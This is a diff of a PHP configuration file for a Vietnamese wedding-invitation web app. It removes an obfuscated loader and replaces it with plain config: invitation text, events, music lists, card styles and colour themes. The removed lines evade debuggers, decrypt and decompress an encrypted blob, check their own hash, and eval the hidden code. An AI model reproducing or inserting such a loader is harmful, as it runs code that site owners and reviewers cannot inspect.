@@ -1,28 +1,129 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_wcdpq3cu=('bas'.'e64'.'_de'.'cod'.'e');
-$_pxgunphf=('gzu'.'nco'.'mpr'.'ess');
-$_a4jlop59=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_eotyk0fd='yyOBf9XV';
-$_kdxdljkc='bMkRwQsR';
-$_smo3jo2v='E6nb3/arUv0=';
-$_pfb4bjuz='Zn6Xv8ta';
-$_pvf2983g='BNXbDB6K';
-$_gtbfmvbj='lDBFUu7C';
-$_ypkjl7db='JZo+LQ==';
-$_q0jo21a0='8pVDWTOg';
-$_ecb8p2br=$_wcdpq3cu($_pvf2983g.$_eotyk0fd.$_pfb4bjuz.$_kdxdljkc.$_smo3jo2v);
-$_sqhf64cx=$_wcdpq3cu($_gtbfmvbj.$_q0jo21a0.$_ypkjl7db);
-$_jtzc4fpt=$_wcdpq3cu('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');
-$_ounur2nu=$_a4jlop59($_jtzc4fpt,'aes-256-cbc',$_ecb8p2br,OPENSSL_RAW_DATA,$_sqhf64cx);
-if($_ounur2nu===false){exit;}
-$_it9lv8f0=$_pxgunphf($_ounur2nu);
-if($_it9lv8f0===false){exit;}
-$_wjuss5vt='39df80093a81f233175ae123c3af8597ee6c926429a45c7943084dba8273e520';
-$_bb539q3i=@file_get_contents(__FILE__);
-if($_bb539q3i!==false){
-$_lc90vkiv=str_replace($_wjuss5vt,"0000000000000000000000000000000000000000000000000000000000000000",$_bb539q3i);
-$_ssdo1mdt=hash("sha256",$_lc90vkiv);
-if($_ssdo1mdt!==$_wjuss5vt){@http_response_code(403);exit;}
-}
-eval($_it9lv8f0);
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+$config['content_text'] = array(
+'groom_name' => array('', 80, FALSE),
+'bride_name' => array('', 80, FALSE),
+'c.hero_eyebrow' => array('Chúng mình về chung một nhà', 80, FALSE),
+'c.save_title' => array('Trân trọng kính mời', 80, FALSE),
+'c.save_text' => array('Sự hiện diện của bạn là niềm vinh hạnh cho gia đình chúng mình.', 400, TRUE),
+'c.couple_title' => array('Cô dâu & Chú rể', 60, FALSE),
+'c.bride_fullname' => array('', 80, FALSE),
+'c.bride_info' => array('', 300, TRUE),
+'c.groom_fullname' => array('', 80, FALSE),
+'c.groom_info' => array('', 300, TRUE),
+'c.event_title' => array('Lễ thành hôn', 60, FALSE),
+// Tiêu đề lễ trên thiệp gửi khách nhà gái (thiệp nhà trai / khách chung dùng c.event_title).
+'c.event_title_bride' => array('Lễ vu quy', 60, FALSE),
+'c.event_text' => array('Cùng đếm ngược tới ngày vui của chúng mình', 200, TRUE),
+'c.location_title' => array('Địa điểm tổ chức', 60, FALSE),
+'c.quote' => array('Yêu nhau không phải là nhìn nhau, mà là cùng nhau nhìn về một hướng.', 200, TRUE),
+'c.album_title' => array('Album ảnh cưới', 60, FALSE),
+'c.upload_title' => array('Bạn có ảnh đẹp của chúng mình?', 80, FALSE),
+'c.upload_text' => array('Gửi tặng cô dâu chú rể những khoảnh khắc bạn đã chụp — không cần cài ứng dụng, không cần đăng nhập.', 300, TRUE),
+'c.rsvp_title' => array('Xác nhận tham dự', 60, FALSE),
+'c.rsvp_text' => array('Hãy cho chúng mình biết bạn có đến chung vui được không nhé!', 300, TRUE),
+'c.invite_greeting' => array('Trân trọng kính mời', 60, FALSE),
+'c.wishes_title' => array('Lời chúc', 60, FALSE),
+'c.footer' => array('Cảm ơn bạn đã đến chung vui cùng chúng mình ♡', 200, TRUE),
+);
+$config['content_images'] = array(
+'img.hero_main' => 'Ảnh chính đầu trang',
+'img.hero_left' => 'Ảnh nghiêng bên trái',
+'img.hero_right' => 'Ảnh nghiêng bên phải',
+'img.bride' => 'Ảnh cô dâu',
+'img.groom' => 'Ảnh chú rể',
+'img.event' => 'Ảnh mục lễ cưới',
+'img.quote' => 'Ảnh nền câu trích dẫn',
+);
+
+$config['content_events'] = array(
+array('title' => 'Lễ vu quy', 'place' => 'Tư gia nhà gái', 'address' => '', 'time' => '', 'map' => ''),
+array('title' => 'Tiệc cưới', 'place' => 'Nhà hàng', 'address' => '', 'time' => '', 'map' => ''),
+);
+
+
+$config['music_builtin'] = array(
+'canon-in-d' => array('Canon in D — Pachelbel', 'canon-in-d.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 3.0'),
+'bridal-chorus' => array('Bridal Chorus (Here Comes the Bride) — Wagner', 'bridal-chorus.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 3.0'),
+'wedding-march' => array('Wedding March — Mendelssohn', 'wedding-march.mp3', ''),
+'air-on-g-string' => array('Air on the G String — Bach', 'air-on-g-string.mp3', ''),
+'ave-maria' => array('Ave Maria — Schubert / Gounod', 'ave-maria.mp3', ''),
+
+'reawakening' => array('Reawakening — piano & cello', 'reawakening.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+'there-is-romance' => array('There is Romance — piano', 'there-is-romance.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+'gymnopedie-no-1' => array('Gymnopédie No. 1 — Satie', 'gymnopedie-no-1.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+'prelude-in-c' => array('Prelude in C — Bach', 'prelude-in-c.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+'canon-in-d-harps' => array('Canon in D (hai đàn hạc) — Pachelbel', 'canon-in-d-harps.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+'crinoline-dreams' => array('Crinoline Dreams — piano & dây', 'crinoline-dreams.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+'procession-of-the-king' => array('Procession of the King — dàn dây', 'procession-of-the-king.mp3', 'Kevin MacLeod (incompetech.com) · CC BY 4.0'),
+);
+
+
+
+$config['music_suggestions'] = array(
+'beautiful-in-white' => array('Beautiful In White', 'Shane Filan'),
+'cham-em-mot-doi' => array('Chăm Em Một Đời', 'Đức Phúc'),
+'du-cho-tan-the' => array('Dù Cho Tận Thế', 'Erik'),
+'em-dong-y' => array('Em Đồng Ý (I Do)', 'Đức Phúc x 911'),
+'i-do' => array('I Do', '911'),
+'is-it-you' => array('Is It You (I Have Loved)', 'Dana Winner'),
+'ngay-nay-nguoi-con-gai-nay' => array('Ngày Này, Người Con Gái Này', 'Vũ Cát Tường'),
+'tonight-i-celebrate' => array('Tonight I Celebrate My Love', 'Peabo Bryson & Roberta Flack'),
+'when-you-tell-me' => array('When You Tell Me That You Love Me', 'Westlife ft. Diana Ross'),
+'hon-ca-yeu' => array('Hơn Cả Yêu', 'Đức Phúc'),
+'cuoi-nhau-di' => array('Cưới Nhau Đi (Yes I Do)', 'Bùi Anh Tuấn & Hiền Hồ'),
+'ngay-dau-tien' => array('Ngày Đầu Tiên', 'Đức Phúc'),
+'noi-nay-co-anh' => array('Nơi Này Có Anh', 'Sơn Tùng M-TP'),
+'mot-nha' => array('Một Nhà', 'Da LAB'),
+'sugar' => array('Sugar', 'Maroon 5'),
+'marry-you' => array('Marry You', 'Bruno Mars'),
+'thuyen-hoa' => array('Thuyền Hoa', 'Quang Linh'),
+'dam-cuoi-tren-duong-que' => array('Đám Cưới Trên Đường Quê', 'Hoàng Thi Thơ'),
+);
+
+
+
+$config['card_styles'] = array(
+'classic' => array('name' => 'Phong bì cổ điển', 'name_en' => 'Classic Envelope', 'desc' => 'Nắp phong bì lật mở, thiệp nhô lên', 'desc_en' => 'The flap lifts and the card rises out', 'open_ms' => 650),
+'gatefold' => array('name' => 'Cổng hai cánh', 'name_en' => 'Double Gate', 'desc' => 'Tháo đai, hai cánh cửa vòm mở ra hai bên', 'desc_en' => 'Untie the band and two arched doors swing open', 'open_ms' => 1250),
+'book' => array('name' => 'Thiệp gấp đôi', 'name_en' => 'Folded Card', 'desc' => 'Bìa cứng lật mở như một cuốn sách', 'desc_en' => 'A hardcover that opens like a book', 'open_ms' => 1150),
+'popup' => array('name' => 'Pop-up 3D', 'name_en' => '3D Pop-up', 'desc' => 'Mở thiệp, cổng hoa và bảng tên dựng đứng', 'desc_en' => 'Open it and a floral arch with a name plaque stands up', 'open_ms' => 800),
+'scroll' => array('name' => 'Cuộn thư', 'name_en' => 'Scroll', 'desc' => 'Tháo nơ, cuộn giấy trải dài xuống', 'desc_en' => 'Untie the ribbon and the scroll unrolls', 'open_ms' => 700),
+'wax' => array('name' => 'Sáp niêm phong', 'name_en' => 'Wax Seal', 'desc' => 'Lật phong bì, bẻ dấu sáp, thiệp trượt ra', 'desc_en' => 'Turn the envelope, break the seal, the card slides out', 'open_ms' => 1850),
+'foil-flip' => array('name' => 'Ép kim xoay', 'name_en' => 'Foil Flip', 'desc' => 'Thiệp dày ép kim nhũ, xoay 180° ra mặt sau', 'desc_en' => 'A thick foil-pressed card that flips 180°', 'open_ms' => 520),
+'lasercut' => array('name' => 'Ren cắt laser', 'name_en' => 'Laser-cut Lace', 'desc' => 'Lớp ren cắt laser nhấc lên, nhiều lớp chiều sâu', 'desc_en' => 'A laser-cut lace layer lifts, layered depth', 'open_ms' => 950),
+'songhy-tri' => array('name' => 'Song hỷ ba tấm', 'name_en' => 'Double Happiness Trifold', 'desc' => 'Thiệp đỏ truyền thống, hai tấm bên lần lượt mở', 'desc_en' => 'Traditional red card, side panels open one by one', 'open_ms' => 1500),
+'watercolor' => array('name' => 'Màu nước & ảnh', 'name_en' => 'Watercolour & Photo', 'desc' => 'Hoa lá màu nước, ảnh polaroid nhấc lên', 'desc_en' => 'Watercolour florals with a polaroid that lifts', 'open_ms' => 1000),
+
+
+
+);
+
+
+
+$config['themes'] = array(
+'serenity' => array('name' => 'Bạc hà', 'name_en' => 'Mint', 'desc' => 'Xanh bạc hà dịu, thoáng và nhẹ nhàng', 'desc_en' => 'Soft mint green, airy and gentle', 'accent' => '#6fae95', 'hero_sizes' => '(max-width: 760px) 88vw, 680px'),
+'lavender' => array('name' => 'Oải hương', 'name_en' => 'Lavender', 'desc' => 'Tím oải hương lãng mạn, nét chữ bay', 'desc_en' => 'Romantic lavender with flowing type', 'accent' => '#c77aab', 'hero_sizes' => '(max-width: 760px) 88vw, 680px'),
+'summer' => array('name' => 'Hoàng hôn', 'name_en' => 'Sunset', 'desc' => 'Cam hoàng hôn ấm áp, tươi vui', 'desc_en' => 'Warm sunset orange, bright and cheerful', 'accent' => '#ec7a63', 'hero_sizes' => '(max-width: 760px) 88vw, 680px'),
+'thiep' => array('name' => 'Thiệp cưới', 'name_en' => 'Wedding Card', 'desc' => 'Ảnh tràn màn hình như tấm thiệp in', 'desc_en' => 'Full-screen photo like a printed card', 'accent' => '#e7746f', 'hero_sizes' => '100vw'),
+'hoangkim' => array('name' => 'Hoàng kim', 'name_en' => 'Golden', 'desc' => 'Vàng kim sang trọng trên nền kem', 'desc_en' => 'Luxurious gold on a cream background', 'accent' => '#8f6d33', 'hero_sizes' => '(max-width: 760px) 62vw, 450px'),
+'songhy' => array('name' => 'Song hỷ', 'name_en' => 'Double Happiness', 'desc' => 'Đỏ truyền thống, chữ Song Hỷ', 'desc_en' => 'Traditional red with the Double Happiness sign', 'accent' => '#b3261e', 'hero_sizes' => '(max-width: 760px) 70vw, 320px'),
+'tapchi' => array('name' => 'Tạp chí', 'name_en' => 'Magazine', 'desc' => 'Đen trắng tối giản kiểu tạp chí', 'desc_en' => 'Minimal black-and-white magazine style', 'accent' => '#1c1c1c', 'hero_sizes' => '(max-width: 760px) 100vw, 52vw'),
+'vuonhoa' => array('name' => 'Vườn hoa', 'name_en' => 'Garden', 'desc' => 'Xanh lá vườn hoa, mộc mạc tự nhiên', 'desc_en' => 'Garden green, rustic and natural', 'accent' => '#5c6b3a', 'hero_sizes' => '(max-width: 760px) 68vw, 310px'),
+'demsao' => array('name' => 'Đêm sao', 'name_en' => 'Starry Night', 'desc' => 'Xanh đêm sao, lấp lánh huyền ảo', 'desc_en' => 'Starry night blue, softly sparkling', 'accent' => '#2a3868', 'hero_sizes' => '(max-width: 760px) 65vw, 300px'),
+'datnung' => array('name' => 'Đất nung', 'name_en' => 'Terracotta', 'desc' => 'Nâu đất nung ấm, phong cách boho', 'desc_en' => 'Warm terracotta, boho style', 'accent' => '#a94f32', 'hero_sizes' => '(max-width: 760px) 68vw, 410px'),
+
+
+
+);
